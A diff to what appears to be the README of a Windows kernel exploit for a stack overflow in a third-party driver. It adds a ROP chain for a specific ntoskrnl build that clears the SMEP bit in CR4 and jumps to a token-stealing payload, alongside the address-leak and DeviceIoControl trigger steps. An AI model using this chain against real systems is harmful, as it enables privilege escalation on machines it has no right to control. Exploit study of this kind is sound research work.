@@ -8,7 +8,24 @@ Vulnerability: Stack based overflow in a third-party driver.
 1. **Leak ntoskrnl address**
     - *NtQuerySystemInformation*
 2. **Setup payload**
-    - *ROP payload*: Description of the payload is in Paged Out #2 ezine. Offsets of gadgets are in main.c
+    - *ROP Chain*: We use only gadgets in ntoskrnl. Exactly, ntoskrnl *10.0.17763.678*
+						
+						pop rcx (1)
+						ptr_userland_memory
+						nt!KiSaveInitialProcessorControlState
+						mov rax, dword [rcx+0x18] (2)
+						pop rcx (1)
+						0xFFFFFFFFFFEFFFFF
+						and ecx, eax (3)
+						mov cr4, ecx (4)
+						OFFSET TOKEN STEALER
+						mov cr4. ecx (4)
+						ret (5)
+						
+						
+		
+		
+
     - *Payload*: We want to elevate our privileges, so our payload is Token Stealer. It is in payload.asm
 3. **Trigger vuln**
     - *DeviceIoControl*
